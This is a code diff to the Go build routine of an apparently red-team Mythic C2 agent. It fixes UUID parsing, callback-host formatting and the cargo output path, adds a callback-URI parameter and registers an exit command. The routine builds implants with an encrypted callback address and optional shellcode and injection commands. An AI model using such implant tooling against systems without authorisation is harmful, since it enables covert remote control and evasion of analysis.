@@ -11,8 +11,10 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainerPkg/agent_structs"
+	"github.com/google/uuid"
 )
 
 // Build is called by Mythic each time an operator generates a new payload.
@@ -30,16 +32,30 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 
 	// payloadUUID is the 36-char UUID string baked into the implant for checkin.
 	// aesKey is the 32-char hex of the 16-byte UUID used as IMPLANT_SECRET.
-	payloadUUID := input.PayloadUUID.String()
-	aesKey := hex.EncodeToString(input.PayloadUUID[:])
+	parsedUUID, err := uuid.Parse(input.PayloadUUID)
+	if err != nil {
+		resp.BuildStdErr = fmt.Sprintf("invalid PayloadUUID: %v", err)
+		return resp
+	}
+	payloadUUID := input.PayloadUUID
+	aesKey := hex.EncodeToString(parsedUUID[:])
 
 	// The callback host/port come from the C2 profile parameters.
+	// Strip the scheme from callback_host: Mythic returns "https://host", the implant
+	// reconstructs the full URL — storing the scheme twice produces an invalid URL (BUG-02).
 	var callbackHost string
 	if len(input.C2Profiles) > 0 {
 		c2 := input.C2Profiles[0]
 		host, _ := c2.GetArg("callback_host")
 		port, _ := c2.GetArg("callback_port")
-		callbackHost = fmt.Sprintf("%s:%s", host, port)
+		hostStr := strings.TrimPrefix(fmt.Sprintf("%v", host), "https://")
+		hostStr = strings.TrimPrefix(hostStr, "http://")
+		callbackHost = fmt.Sprintf("%s:%v", hostStr, port)
+	}
+
+	callbackURI, _ := input.BuildParameters.GetStringArg("callback_uri")
+	if callbackURI == "" {
+		callbackURI = "/"
 	}
 
 	// Encrypt the callback address so it cannot be extracted as plaintext from the binary.
@@ -93,6 +109,7 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 		fmt.Sprintf("CALLBACK=%s", encryptedCallback),
 		fmt.Sprintf("IMPLANT_SECRET=%s", aesKey),
 		fmt.Sprintf("PAYLOAD_UUID=%s", payloadUUID),
+		fmt.Sprintf("CALLBACK_URI=%s", callbackURI),
 	)
 
 	out, err := cmd.CombinedOutput()
@@ -103,8 +120,13 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 	}
 	resp.BuildStdOut = string(out)
 
-	// Locate the compiled binary
-	binaryPath := filepath.Join(crateDir, "target", target, profile, binName+outputExt)
+	// Locate the compiled binary.
+	// cargo puts debug builds in target/<target>/debug/, not target/<target>/dev/ (BUG-07).
+	outputProfile := profile
+	if profile == "dev" {
+		outputProfile = "debug"
+	}
+	binaryPath := filepath.Join(crateDir, "target", target, outputProfile, binName+outputExt)
 
 	if shellcode && (targetOS == "linux" || targetOS == "macos") {
 		scPath := binaryPath + ".bin"
@@ -174,4 +196,5 @@ func RegisterAllCommands() {
 	registerKilldate()
 	registerInject()
 	registerIntegrity()
+	registerExit()
 }
